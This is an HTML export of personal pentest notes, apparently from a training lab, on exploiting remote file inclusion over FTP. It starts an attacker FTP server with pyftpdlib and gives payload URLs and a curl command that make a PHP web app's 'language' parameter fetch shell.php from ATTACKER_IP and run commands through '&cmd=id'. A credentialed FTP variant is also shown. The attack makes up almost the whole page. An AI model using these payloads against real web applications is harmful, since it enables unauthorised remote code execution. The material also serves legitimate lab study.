<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>FTP</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>FTP</h1><br/><br /><strong><span style="color:#00ff00;">FTP</span></strong><br />2.1 Start a FTP server with Python&#39;s pyftpdlib, as follows:    <div class="codebox"><pre>$ python -m pyftpdlib -p 21</pre></div><br />    <a href=""><img src="images/2361-1.png" alt="images/2361-1.png" /></a><br />2.2 Include the shell of point 1 through RFI on the WebApp using <code>&lt;ATTACKER_IP&gt;</code>. We will also specify the command to be executed with <code>&amp;cmd=id</code>:   <div class="codebox"><pre>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=ftp://&lt;ATTACKER_IP&gt;/shell.php&amp;cmd=id</pre></div><br />    <a href=""><img src="images/2361-2.png" alt="images/2361-2.png" /></a><br />    By default, PHP tries to authenticate as an anonymous user. If our attacker server requires valid authentication, then the credentials can be specified in the URL, as follows:    <div class="codebox"><pre>$ curl &#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=ftp://user:pass@localhost/shell.php&amp;cmd=id&#39;</pre></div><code><br /></code>2.3 At this point we should have got a connection on the python server of point 2.1<br />    Note: examine the request arrived on the attacker machine to ensure the request is being sent as we specified it. <br />        For example, if we saw an extra extension (.php) was appended to the request, then we can omit from our payload<br />   <a href=""><img src="images/2361-3.png" alt="images/2361-3.png" /></a></div>
</body>
</html>
